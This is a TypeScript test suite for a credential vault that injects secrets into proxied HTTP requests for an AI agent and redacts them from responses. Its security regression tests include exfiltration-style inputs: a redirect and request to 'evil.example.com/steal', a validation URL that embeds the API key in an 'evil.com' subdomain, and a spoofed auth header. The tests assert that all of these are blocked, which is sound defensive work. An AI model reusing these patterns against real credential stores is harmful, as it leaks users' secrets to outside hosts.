import assert from "node:assert/strict";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { after, before, beforeEach, describe, it } from "node:test";
import { dispatch } from "../helper/dispatch.js";
import { allowInsecureLoopbackForTests } from "../helper/protocols/http.js";
import { setUserConfirmForTests } from "../helper/user-dialog.js";
import { Vault } from "../helper/vault.js";
import { hostFromUrlTemplate, typeFromTemplate } from "../server/tools/http.js";
import { getTemplate, resolveOAuthProvider, searchTemplates } from "../server/templates.js";
import type { Op } from "../shared/protocol.js";

// ---------- 模拟 API：回显收到的请求（用于检查注入与脱敏） ----------
let base = "";
let server: http.Server;
const received: Array<{ url: string; headers: http.IncomingHttpHeaders; body: string }> = [];

before(async () => {
  allowInsecureLoopbackForTests(true);
  server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      received.push({ url: req.url!, headers: req.headers, body });
      const u = new URL(req.url!, "http://x");
      if (u.pathname === "/redirect") {
        res.writeHead(302, { Location: "https://evil.example.com/steal" }).end();
      } else if (u.pathname === "/bin") {
        res.writeHead(200, { "Content-Type": "application/octet-stream" });
        res.end(Buffer.concat([Buffer.from([0, 1, 2]), Buffer.from(String(req.headers.authorization ?? ""))]));
      } else if (u.pathname === "/hex") {
        res.writeHead(200, { "Content-Type": "text/plain" });
        res.end(Buffer.from(String(req.headers.authorization ?? "").replace("Bearer ", "")).toString("hex").toUpperCase());
      } else if (u.pathname === "/me") {
        res.writeHead(req.headers.authorization === "Bearer sk-SECRET-123456" ? 200 : 401, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ ok: req.headers.authorization === "Bearer sk-SECRET-123456" }));
      } else {
        // 回显：故意把认证信息放进响应，检验脱敏
        res.writeHead(200, { "Content-Type": "application/json", "X-Echo-Auth": String(req.headers.authorization ?? "") });
        res.end(JSON.stringify({ path: u.pathname, query: Object.fromEntries(u.searchParams), headers: req.headers, body }));
      }
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
});

after(() => {
  server.close();
  allowInsecureLoopbackForTests(false);
  setUserConfirmForTests(null);
});

let vault: Vault;
let confirms: string[] = [];
let confirmAnswer = true;
beforeEach(() => {
  vault = new Vault(path.join(fs.mkdtempSync(path.join(os.tmpdir(), "credmcp-h-")), "vault"));
  vault.init();
  received.length = 0;
  confirms = [];
  confirmAnswer = true;
  setUserConfirmForTests(async (msg) => {
    confirms.push(msg);
    return confirmAnswer;
  });
});

async function call<T = Record<string, unknown>>(op: Op, params: Record<string, unknown>): Promise<T> {
  const r = await dispatch(vault, { id: 1, op, params: { purpose: "自动化测试", ...params } }, { session: "t" });
  if (!r.ok) throw new Error(r.error);
  return r.result as T;
}

const SECRET = "sk-SECRET-123456";

async function setOpenAiLike(extra: Record<string, unknown> = {}) {
  return call("set", {
    type: "open_ai_api",
    name: "main",
    secrets: { apiKey: SECRET },
    attributes: { url: base },
    template: "openai",
    http: { inject: { headers: { Authorization: "Bearer {{apiKey}}" } }, allowed_hosts: ["127.0.0.1"], test: { method: "GET", url: "{{url}}/me" }, ...extra },
  });
}

describe("模板库", () => {
  it("自带模板库可搜索：OpenAI 模板有注入规则、验证请求和域名；自带模板排在前面", () => {
    const top = searchTemplates("openai", undefined, 10)[0]!;
    assert.equal(top.id, "openai");
    assert.equal(top.source, "catalog");
    const t = getTemplate("OpenAI")!;
    assert.deepEqual(t.inject, { headers: { Authorization: "Bearer {{apiKey}}" } });
    assert.deepEqual(t.hosts, ["api.openai.com"]);
    assert.equal(t.test?.url, "https://api.openai.com/v1/models");
    assert.equal(searchTemplates("bearer", undefined, 5)[0]!.source, "builtin");
  });

  it("自带模板库的每个模板都自洽：占位符引用的字段存在，验证请求是 https", () => {
    const catalog = JSON.parse(fs.readFileSync(path.join(process.cwd(), "templates", "catalog.json"), "utf8")) as { templates: Array<Record<string, any>> };
    assert.ok(catalog.templates.length >= 40);
    for (const t of catalog.templates) {
      const names = new Set((t.fields as Array<{ name: string }>).map((f) => f.name));
      const refs = JSON.stringify([t.inject, t.test]).match(/\{\{(\w+)\}\}/g)?.map((m) => m.slice(2, -2)) ?? [];
      for (const r of refs) assert.ok(names.has(r), `${t.id} 引用了不存在的字段 ${r}`);
      assert.ok(t.inject, `${t.id} 缺少注入规则`);
      assert.ok(t.test || t.hosts?.length, `${t.id} 既没有验证请求也没有域名`);
      if (t.test) assert.match(t.test.url, /^(https:\/\/|\{\{apiUrl\}\})/, t.id);
    }
  });

  it("n8n 的 OAuth2 模板可作为 OAuth provider（需本地生成 n8n 模板库）", { skip: !getTemplate("gmailOAuth2") && "未生成 n8n 模板库" }, () => {
    const p = resolveOAuthProvider("gmailOAuth2")!;
    assert.equal(p.token_url, "https://oauth2.googleapis.com/token");
    assert.ok(p.default_scopes.includes("https://mail.google.com/"));
    assert.equal(p.extra_auth_params?.access_type, "offline");
    assert.equal(resolveOAuthProvider("google")!.label, "Google", "内置预设优先");
  });

  it("类型名与域名推导", () => {
    assert.equal(typeFromTemplate("openAiApi"), "open_ai_api");
    assert.equal(hostFromUrlTemplate("{{url}}/models", { url: "https://api.openai.com/v1" }), "api.openai.com");
    assert.equal(hostFromUrlTemplate("https://api.trello.com/1/tokens/{{apiToken}}/member", {}), "api.trello.com");
    assert.equal(hostFromUrlTemplate("https://{{subdomain}}.zendesk.com/api", { subdomain: "acme" }), "acme.zendesk.com");
    assert.equal(hostFromUrlTemplate("https://{{subdomain}}.zendesk.com/api", {}), null, "域名含秘密/未知字段时无法确定");
  });
});

describe("代理调用", () => {
  it("注入认证头；响应（含响应头）中回显的秘密被抹掉", async () => {
    await setOpenAiLike();
    const r = await call<{ status: number; body: string; headers: Record<string, string> }>("httpRequest", {
      type: "open_ai_api", name: "main", method: "POST", url: `${base}/v1/chat`, body: { hello: "world" },
    });
    assert.equal(received[0]!.headers.authorization, `Bearer ${SECRET}`, "上游收到了注入的认证头");
    assert.equal(received[0]!.headers["content-type"], "application/json");
    assert.equal(r.status, 200);
    assert.equal(r.body.includes(SECRET), false);
    assert.match(r.body, /"authorization":"\[REDACTED\]"/);
    assert.equal(r.headers["x-echo-auth"], undefined, "非白名单响应头不返回");
    assert.equal(JSON.stringify(r).includes(SECRET), false);
  });

  it("agent 不能覆盖认证头；只能发往允许的域名；不跟随重定向", async () => {
    await setOpenAiLike();
    await call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/x`, headers: { authorization: "Bearer attacker" } });
    assert.equal(received[0]!.headers.authorization, `Bearer ${SECRET}`);
    await assert.rejects(call("httpRequest", { type: "open_ai_api", name: "main", url: "https://evil.example.com/steal" }), /不在该凭证允许的范围内/);
    const r = await call<{ status: number; headers: Record<string, string> }>("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/redirect` });
    assert.equal(r.status, 302);
    assert.equal(r.headers.location, "https://evil.example.com/steal");
    assert.equal(received.length, 2, "没有跟随重定向");
  });

  it("查询参数注入、Basic 认证、头名称由非敏感字段展开（通用 header 模板）", async () => {
    await call("set", { type: "t", name: "q", secrets: { key: "QKEY-987654" }, http: { inject: { query: { api_key: "{{key}}" } }, allowed_hosts: ["127.0.0.1"] } });
    await call("httpRequest", { type: "t", name: "q", url: `${base}/a`, query: { api_key: "spoof", x: "1" } });
    assert.match(received[0]!.url, /api_key=QKEY-987654/);
    assert.match(received[0]!.url, /x=1/);

    await call("set", { type: "t", name: "b", secrets: { password: "pw-123456" }, attributes: { user: "alice" }, http: { inject: { basic: { username: "{{user}}", password: "{{password}}" } }, allowed_hosts: ["127.0.0.1"] } });
    const r = await call<{ body: string }>("httpRequest", { type: "t", name: "b", url: `${base}/b` });
    assert.equal(received[1]!.headers.authorization, `Basic ${Buffer.from("alice:pw-123456").toString("base64")}`);
    assert.equal(r.body.includes(Buffer.from("alice:pw-123456").toString("base64")), false);

    await call("set", { type: "t", name: "h", secrets: { key: "HKEY-555555" }, attributes: { headerName: "X-Api-Key" }, http: { inject: { headers: { "{{headerName}}": "{{key}}" } }, allowed_hosts: ["127.0.0.1"] } });
    await call("httpRequest", { type: "t", name: "h", url: `${base}/h` });
    assert.equal(received[2]!.headers["x-api-key"], "HKEY-555555");
  });

  it("验证请求", async () => {
    await setOpenAiLike();
    assert.deepEqual(await call("httpTest", { type: "open_ai_api", name: "main" }), { ok: true, status: 200, excerpt: '{"ok":true}' });
  });

  it("proxy_only：不能读出原值，但仍可代理；关闭需要用户确认", async () => {
    await setOpenAiLike({ proxy_only: true });
    await assert.rejects(call("get", { type: "open_ai_api", name: "main" }), /只能代理调用/);
    const info = await call<{ http: { proxy_only: boolean } }>("info", { type: "open_ai_api", name: "main" });
    assert.equal(info.http.proxy_only, true);
    await call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/x` });

    confirmAnswer = false;
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", proxy_only: false }), /用户拒绝/);
    await assert.rejects(call("get", { type: "open_ai_api", name: "main" }), /只能代理调用/);
    confirmAnswer = true;
    await call("httpConfigure", { type: "open_ai_api", name: "main", proxy_only: false });
    assert.equal((await call<{ fields: Record<string, string> }>("get", { type: "open_ai_api", name: "main" })).fields.apiKey, SECRET);
  });

  it("新增域名、修改注入规则需要用户确认；开启 proxy_only 不需要", async () => {
    await setOpenAiLike();
    confirmAnswer = false;
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", allowed_hosts: ["127.0.0.1", "evil.example.com"] }), /用户拒绝/);
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", inject: { query: { k: "{{apiKey}}" } } }), /用户拒绝/);
    assert.equal(confirms.length, 2);
    assert.match(confirms[0]!, /新增允许发往的域名：evil\.example\.com/);
    await call("httpConfigure", { type: "open_ai_api", name: "main", proxy_only: true });
    assert.equal(confirms.length, 2, "收紧权限不弹窗");
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", allowed_hosts: ["localhost"] }), /非法的域名/);
  });

  it("没有配置代理的凭证不能代理；读取/代理都必须说明目的", async () => {
    vault.set({ type: "api_key", name: "plain", value: "v-123456" });
    await assert.rejects(call("httpRequest", { type: "api_key", name: "plain", url: `${base}/x` }), /没有配置代理调用/);
    const r = await dispatch(vault, { id: 1, op: "httpRequest", params: { type: "api_key", name: "plain", url: `${base}/x` } }, {});
    assert.equal(r.ok, false);
  });

  it("oauth2 凭证代理时自动注入 access token（agent 看不到 token）", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "svc", secrets: {},
      config: { provider: "custom", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token", token_auth_method: "none" },
    });
    const gen = vault.getRecord("oauth2", "svc").record.generation;
    vault.patchRecord("oauth2", "svc", "oauth2", gen, (rec) => {
      rec.state = { access_token: "AT-TOKEN-777777", expires_at: Date.now() + 3600_000 };
    });
    await assert.rejects(
      call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"], inject: { headers: { A: "{{client_secret}}" } } }),
      /不存在的字段 client_secret/,
      "token 类凭证的自定义规则不能引用长期秘密",
    );
    await call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"] });
    assert.equal(confirms.length, 1, "首次为已有凭证开启代理需要确认");
    const r = await call<{ body: string }>("httpRequest", { type: "oauth2", name: "svc", url: `${base}/graph` });
    assert.equal(received[0]!.headers.authorization, "Bearer AT-TOKEN-777777");
    assert.equal(r.body.includes("AT-TOKEN-777777"), false);
  });

  it("审计记录包含目标（方法 + 域名 + 路径，不含查询参数）", async () => {
    await setOpenAiLike();
    await call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/v1/models?secret=abc`, purpose: "列出模型" });
    const log = fs.readFileSync(vault.auditPath, "utf8");
    assert.match(log, /"target":"GET 127\.0\.0\.1:\d+\/v1\/models"/);
    assert.equal(log.includes("secret=abc"), false);
    assert.equal(log.includes(SECRET), false);
  });

  // ---------- 第二轮安全审查的回归测试 ----------

  it("[严重] 修改验证请求不能引用秘密字段（审查复现的攻击路径）", async () => {
    await setOpenAiLike({ proxy_only: true });
    for (const url of ["{{apiKey}}", "https://{{apiKey}}.x.invalid/", `${base}/me?k={{apiKey}}`]) {
      await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", test: { method: "GET", url } }), /不能引用秘密字段/);
    }
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", test: { method: "POST", url: `${base}/me` } }), /只能是 GET 或 HEAD/);
    await call("httpConfigure", { type: "open_ai_api", name: "main", test: { method: "GET", url: "{{url}}/me" } });
  });

  it("[严重] 协议凭证的长期秘密不参与渲染", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "svc", secrets: { client_secret: "CLIENT-SECRET-999" },
      config: { provider: "custom", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token" },
    });
    await assert.rejects(
      call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"], test: { method: "GET", url: `${base}/x?s={{client_secret}}` } }),
      /不存在的字段 client_secret/,
    );
  });

  it("[严重] 错误信息（含审计日志）中的秘密被抹掉，包括被小写化的形式", async () => {
    // 模板验证请求允许引用秘密（随新秘密写入）；构造一个把秘密放进域名的验证请求
    await setOpenAiLike({ test: { method: "GET", url: "https://{{apiKey}}.evil.com/" } });
    const r = await dispatch(vault, { id: 1, op: "httpTest", params: { type: "open_ai_api", name: "main", purpose: "测试" } }, { session: "t" });
    assert.equal(r.ok, false);
    const err = !r.ok ? r.error : "";
    assert.equal(err.toLowerCase().includes(SECRET.toLowerCase()), false, err);
    assert.match(err, /REDACTED/);
    assert.equal(fs.readFileSync(vault.auditPath, "utf8").toLowerCase().includes(SECRET.toLowerCase()), false);
  });

  it("[高] 二进制响应中出现秘密时拒绝返回；十六进制（大写）形式也被抹掉", async () => {
    await setOpenAiLike();
    await assert.rejects(call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/bin` }), /拒绝返回/);
    const r = await call<{ body: string }>("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/hex` });
    assert.equal(r.body, "[REDACTED]");
  });

  it("[中] proxy_only 的 token 类凭证不能取出 access token，但可代理", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "svc", secrets: {},
      config: { provider: "custom", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token", token_auth_method: "none" },
    });
    vault.patchRecord("oauth2", "svc", "oauth2", vault.getRecord("oauth2", "svc").record.generation, (rec) => {
      rec.state = { access_token: "AT-TOKEN-777777", expires_at: Date.now() + 3600_000 };
    });
    await call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"], proxy_only: true });
    await assert.rejects(call("accessToken", { type: "oauth2", name: "svc" }), /只能代理调用/);
    await assert.rejects(call("accessToken", { type: "oauth2", name: "svc", viaProxy: true }), /只能代理调用/, "外部请求不能伪造内部标记");
    await call("httpRequest", { type: "oauth2", name: "svc", url: `${base}/x` });
    assert.equal(received.at(-1)!.headers.authorization, "Bearer AT-TOKEN-777777");
  });

  it("[中] 覆盖和删除由 helper 弹窗确认", async () => {
    await setOpenAiLike();
    confirmAnswer = false;
    await assert.rejects(call("set", { type: "open_ai_api", name: "main", value: "attacker-key", overwrite: true }), /用户拒绝了覆盖/);
    await assert.rejects(call("delete", { type: "open_ai_api", name: "main" }), /用户拒绝了删除/);
    assert.equal(vault.getRecord("open_ai_api", "main").record.secrets!.apiKey, SECRET);
    confirmAnswer = true;
    await call("delete", { type: "open_ai_api", name: "main" });
    assert.match(confirms.at(-1)!, /删除凭证/);
  });

  it("GET 请求不能带请求体", async () => {
    await setOpenAiLike();
    await assert.rejects(call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/x`, body: "x" }), /不能带请求体/);
  });

  it("token 类凭证可自定义注入：{{access_token}}（如 GitHub git 推送要求的 Basic 认证）", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "gh", secrets: {},
      config: { provider: "github", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token", token_auth_method: "none" },
    });
    vault.patchRecord("oauth2", "gh", "oauth2", vault.getRecord("oauth2", "gh").record.generation, (rec) => {
      rec.state = { access_token: "gho_TOKEN_123456", expires_at: Date.now() + 3600_000 };
    });
    await call("httpConfigure", {
      type: "oauth2", name: "gh", allowed_hosts: ["127.0.0.1"],
      inject: { basic: { username: "x-access-token", password: "{{access_token}}" } },
    });
    const r = await call<{ body: string }>("httpRequest", { type: "oauth2", name: "gh", url: `${base}/git` });
    assert.equal(received.at(-1)!.headers.authorization, `Basic ${Buffer.from("x-access-token:gho_TOKEN_123456").toString("base64")}`);
    assert.equal(r.body.includes("gho_TOKEN_123456"), false);
    assert.equal(r.body.includes(Buffer.from("x-access-token:gho_TOKEN_123456").toString("base64")), false);
  });
});
